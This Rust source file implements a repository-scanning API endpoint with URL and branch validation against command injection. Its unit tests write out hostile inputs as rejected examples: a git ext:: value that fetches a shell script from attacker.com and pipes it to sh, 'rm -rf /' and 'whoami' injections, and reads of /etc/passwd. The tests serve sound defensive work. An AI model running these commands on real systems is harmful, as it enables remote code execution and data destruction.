use crate::app::AppState;
use crate::error::ApiError;
/// Repo scan handler — clone a git repo, find contracts, scan all of them.
use axum::extract::State;
use axum::Json;
use serde::{Deserialize, Serialize};

#[derive(Debug, Deserialize)]
pub struct RepoScanRequest {
    pub repo_url: String,
    pub branch: Option<String>,
}

#[derive(Debug, Serialize)]
pub struct RepoScanResponse {
    pub repo_url: String,
    pub repo_name: String,
    pub files_found: usize,
    pub files_scanned: usize,
    pub total_findings: usize,
    pub results: Vec<FileScanResult>,
    pub debug: Option<DebugInfo>,
}

#[derive(Debug, Serialize)]
pub struct FileScanResult {
    pub path: String,
    pub language: String,
    pub source: String,
    pub findings_count: usize,
    pub findings: Vec<serde_json::Value>,
    pub program_id: String,
}

#[derive(Debug, Serialize)]
pub struct DebugInfo {
    pub clone_ok: bool,
    pub files_discovered: usize,
    pub files_read_ok: usize,
    pub files_read_err: usize,
    pub files_too_small: usize,
    pub files_scanned_ok: usize,
    pub files_panic: usize,
    pub first_error: Option<String>,
    pub sample_paths: Vec<String>,
}

fn extension_to_language(ext: &str) -> Option<&str> {
    match ext {
        "sol" => Some("solidity"),
        "rs" => Some("rust"),
        "anchor" => Some("anchor"),
        _ => None,
    }
}

pub async fn scan_repo(
    State(_state): State<AppState>,
    Json(req): Json<RepoScanRequest>,
) -> Result<Json<RepoScanResponse>, ApiError> {
    // C1 FIX: Validate repository URL before any git operations
    validate_repo_url(&req.repo_url)?;
    if let Some(ref branch) = req.branch {
        validate_branch(branch)?;
    }

    // H2 FIX: Move all blocking I/O to a dedicated thread pool
    let repo_url = req.repo_url.clone();
    let branch = req.branch.clone();
    let result = tokio::task::spawn_blocking(move || scan_repo_sync(repo_url, branch))
        .await
        .map_err(|e| ApiError::InternalError(format!("Task failed: {}", e)))?;

    result.map(Json)
}

fn scan_repo_sync(repo_url: String, branch: Option<String>) -> Result<RepoScanResponse, ApiError> {
    let repo_name = repo_url
        .trim_end_matches('/')
        .trim_end_matches(".git")
        .rsplit('/')
        .next()
        .unwrap_or("repo")
        .to_string();

    let tmp_dir = std::env::temp_dir().join(format!(
        "digger_scan_{}_{}",
        repo_name,
        uuid::Uuid::new_v4()
    ));
    std::fs::create_dir_all(&tmp_dir).map_err(|e| ApiError::InternalError(e.to_string()))?;

    // H3: Ensure temp dir is cleaned up on ALL error paths
    let tmp_dir_clone = tmp_dir.clone();
    struct CleanupGuard(std::path::PathBuf);
    impl Drop for CleanupGuard {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }
    let _cleanup_guard = CleanupGuard(tmp_dir_clone);

    // Stage 1: Clone
    let branch_arg = branch.as_deref().unwrap_or("main");
    let clone_ok = {
        let status = std::process::Command::new("git")
            .args([
                "clone",
                "--depth",
                "1",
                "--branch",
                branch_arg,
                &repo_url,
                tmp_dir.to_str().unwrap_or_default(),
            ])
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .status();

        match status {
            Ok(s) if s.success() => true,
            _ => {
                let _ = std::fs::remove_dir_all(&tmp_dir);
                std::fs::create_dir_all(&tmp_dir)
                    .map_err(|e| ApiError::InternalError(e.to_string()))?;
                let fallback = std::process::Command::new("git")
                    .args([
                        "clone",
                        "--depth",
                        "1",
                        &repo_url,
                        tmp_dir.to_str().unwrap_or_default(),
                    ])
                    .stdout(std::process::Stdio::piped())
                    .stderr(std::process::Stdio::piped())
                    .status()
                    .map_err(|e| ApiError::InternalError(format!("git not found: {}", e)))?;
                fallback.success()
            }
        }
    };

    if !clone_ok {
        let _ = std::fs::remove_dir_all(&tmp_dir);
        return Err(ApiError::InternalError(
            "Failed to clone repository".to_string(),
        ));
    }

    // Stage 2: Discover files
    let mut source_files: Vec<(String, String)> = Vec::new();
    let root = tmp_dir.to_str().unwrap_or_default();
    find_source_files(root, root, &mut source_files);
    let files_discovered = source_files.len();

    let sample_paths: Vec<String> = source_files
        .iter()
        .take(5)
        .map(|(p, _)| p.clone())
        .collect();

    // Stage 3-10: Scan each file
    let mut results: Vec<FileScanResult> = Vec::new();
    let mut total_findings = 0;
    let mut files_read_ok = 0usize;
    let mut files_read_err = 0usize;
    let mut files_too_small = 0usize;
    let mut files_panic = 0usize;
    let mut first_error: Option<String> = None;

    for (rel_path, lang) in &source_files {
        // Stage 4: Read file
        let full_path = tmp_dir.join(rel_path);
        let code = match std::fs::read(&full_path) {
            Ok(bytes) => String::from_utf8_lossy(&bytes).to_string(),
            Err(_e) => {
                files_read_err += 1;
                if first_error.is_none() {
                    first_error = Some(format!("read failed: {}", rel_path));
                }
                continue;
            }
        };
        files_read_ok += 1;

        if code.len() < 10 {
            files_too_small += 1;
            continue;
        }

        // Stage 5-9: Parse, build IR, graph, hypothesis
        let code_for_source = code.clone();
        let scan_result = {
            let lang_owned = lang.to_string();
            let code_owned = code;
            std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                let raw = digger_parser::parse_program(&code_owned, &lang_owned);
                let language = match lang_owned.as_str() {
                    "solidity" => digger_ir::Language::Solidity,
                    "anchor" => digger_ir::Language::Anchor,
                    "rust" => digger_ir::Language::Rust,
                    _ => digger_ir::Language::Unknown,
                };
                let ir = digger_graph::build_system_ir_with_language(raw, language);
                digger_hypothesis::derive(&ir)
            }))
        };

        // Stage 10: Aggregate results
        match scan_result {
            Ok(hypo_result) => {
                let findings: Vec<serde_json::Value> = hypo_result
                    .hypotheses
                    .iter()
                    .map(|h| {
                        serde_json::json!({
                            "id": h.id.0,
                            "type": h.hypothesis_type.to_string(),
                            "severity": format!("{:?}", h.severity),
                            "description": h.description,
                            "function": h.primary_function,
                            "evidence_count": h.evidence.len(),
                        })
                    })
                    .collect();

                total_findings += findings.len();
                results.push(FileScanResult {
                    path: rel_path.clone(),
                    language: lang.to_string(),
                    source: code_for_source,
                    findings_count: findings.len(),
                    findings,
                    program_id: hypo_result.program_id,
                });
            }
            Err(e) => {
                files_panic += 1;
                if first_error.is_none() {
                    let _msg = if let Some(s) = e.downcast_ref::<String>() {
                        s.clone()
                    } else if let Some(s) = e.downcast_ref::<&str>() {
                        s.to_string()
                    } else {
                        "unknown panic".to_string()
                    };
                    first_error = Some(format!("parse failed: {}", rel_path));
                }
            }
        }
    }

    // Stage 11-12: Response
    let files_scanned = results.len();
    let debug = Some(DebugInfo {
        clone_ok,
        files_discovered,
        files_read_ok,
        files_read_err,
        files_too_small,
        files_scanned_ok: files_scanned,
        files_panic,
        first_error,
        sample_paths,
    });

    // Cleanup
    let _ = std::fs::remove_dir_all(&tmp_dir);

    Ok(RepoScanResponse {
        repo_url,
        repo_name,
        files_found: files_discovered,
        files_scanned,
        total_findings,
        results,
        debug,
    })
}

/// C1 FIX: Validate repository URL — reject dangerous protocols and injection vectors.
fn validate_repo_url(url: &str) -> Result<(), ApiError> {
    let url = url.trim();

    // Must be non-empty
    if url.is_empty() {
        return Err(ApiError::BadRequest("Repository URL is required".into()));
    }

    // SSRF protection: validate host/IP via DNS resolution
    crate::net_guard::validate_external_url(url)?;

    // Must use approved schemes
    if !url.starts_with("https://") && !url.starts_with("http://") && !url.starts_with("git://") {
        return Err(ApiError::BadRequest(
            "Only https://, http://, and git:// URLs are allowed".into(),
        ));
    }

    // Block dangerous git transport mechanisms
    let lower = url.to_lowercase();
    if lower.contains("ext::") {
        return Err(ApiError::BadRequest(
            "ext:: transport is not allowed".into(),
        ));
    }
    if lower.contains("--upload-pack") || lower.contains("--receive-pack") {
        return Err(ApiError::BadRequest(
            "Custom git transport options are not allowed".into(),
        ));
    }
    if lower.contains("--exec") || lower.contains("--uploadpack") {
        return Err(ApiError::BadRequest(
            "Custom git transport options are not allowed".into(),
        ));
    }

    // Block shell metacharacters
    for ch in [
        '`', '$', '(', ')', '{', '}', '|', ';', '&', '<', '>', '\n', '\r',
    ] {
        if url.contains(ch) {
            return Err(ApiError::BadRequest(format!(
                "URL contains invalid character: '{}'",
                ch
            )));
        }
    }

    // Block file:// URIs (local file access)
    if lower.starts_with("file://") {
        return Err(ApiError::BadRequest("file:// URLs are not allowed".into()));
    }

    Ok(())
}

/// C1 FIX: Validate branch name — reject injection via --branch argument.
fn validate_branch(branch: &str) -> Result<(), ApiError> {
    let branch = branch.trim();
    if branch.is_empty() {
        return Ok(());
    }

    // Branch names must be alphanumeric with dots, hyphens, slashes, underscores
    for ch in branch.chars() {
        if !ch.is_alphanumeric() && ch != '.' && ch != '-' && ch != '/' && ch != '_' {
            return Err(ApiError::BadRequest(format!(
                "Invalid character '{}' in branch name",
                ch
            )));
        }
    }

    // Block path traversal in branch names
    if branch.contains("..") {
        return Err(ApiError::BadRequest(
            "Branch name cannot contain '..'".into(),
        ));
    }

    // Block absolute paths
    if branch.starts_with('/') || branch.starts_with('\\') {
        return Err(ApiError::BadRequest(
            "Branch name cannot be an absolute path".into(),
        ));
    }

    Ok(())
}

fn find_source_files(root: &str, dir: &str, files: &mut Vec<(String, String)>) {
    find_source_files_depth(root, dir, files, 0, 50);
}

fn find_source_files_depth(
    root: &str,
    dir: &str,
    files: &mut Vec<(String, String)>,
    depth: usize,
    max_depth: usize,
) {
    if depth > max_depth {
        return;
    }

    let entries = match std::fs::read_dir(dir) {
        Ok(e) => e,
        Err(_) => return,
    };

    for entry in entries.flatten() {
        let path = entry.path();
        let metadata = match std::fs::metadata(&path) {
            Ok(m) => m,
            Err(_) => continue,
        };

        if metadata.is_dir() {
            let name = path.file_name().unwrap_or_default().to_string_lossy();
            if name.starts_with('.')
                || name == "node_modules"
                || name == "target"
                || name == "lib"
                || name == "test"
            {
                continue;
            }
            if let Some(p) = path.to_str() {
                find_source_files_depth(root, p, files, depth + 1, max_depth);
            }
        } else if let Some(ext) = path.extension().and_then(|e| e.to_str()) {
            if let Some(lang) = extension_to_language(ext) {
                let rel = path
                    .strip_prefix(root)
                    .unwrap_or(&path)
                    .to_string_lossy()
                    .to_string();
                files.push((rel, lang.to_string()));
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn validate_repo_url_allows_https() {
        assert!(validate_repo_url("https://github.com/org/repo").is_ok());
    }

    #[test]
    fn validate_repo_url_blocks_http() {
        assert!(validate_repo_url("http://github.com/org/repo").is_err());
    }

    #[test]
    fn validate_repo_url_blocks_git() {
        assert!(validate_repo_url("git://github.com/org/repo").is_err());
    }

    #[test]
    fn validate_repo_url_blocks_file() {
        assert!(validate_repo_url("file:///etc/passwd").is_err());
    }

    #[test]
    fn validate_repo_url_blocks_ext_protocol() {
        assert!(validate_repo_url("ext::sh -c 'curl attacker.com/shell.sh|sh'").is_err());
    }

    #[test]
    fn validate_repo_url_blocks_upload_pack() {
        assert!(validate_repo_url("https://github.com/repo --upload-pack=malicious").is_err());
    }

    #[test]
    fn validate_repo_url_blocks_shell_metacharacters() {
        assert!(validate_repo_url("https://github.com/repo; rm -rf /").is_err());
        assert!(validate_repo_url("https://github.com/repo`whoami`").is_err());
        assert!(validate_repo_url("https://github.com/repo$(cmd)").is_err());
        assert!(validate_repo_url("https://github.com/repo|cat").is_err());
        assert!(validate_repo_url("https://github.com/repo&&whoami").is_err());
        assert!(validate_repo_url("https://github.com/repo>file").is_err());
    }

    #[test]
    fn validate_repo_url_blocks_empty() {
        assert!(validate_repo_url("").is_err());
        assert!(validate_repo_url("   ").is_err());
    }

    #[test]
    fn validate_branch_allows_normal() {
        assert!(validate_branch("main").is_ok());
        assert!(validate_branch("feature/test-branch").is_ok());
        assert!(validate_branch("v1.0.0").is_ok());
    }

    #[test]
    fn validate_branch_blocks_traversal() {
        assert!(validate_branch("../../../etc/passwd").is_err());
    }

    #[test]
    fn validate_branch_blocks_shell_chars() {
        assert!(validate_branch("main; rm -rf /").is_err());
        assert!(validate_branch("main`whoami`").is_err());
    }
}
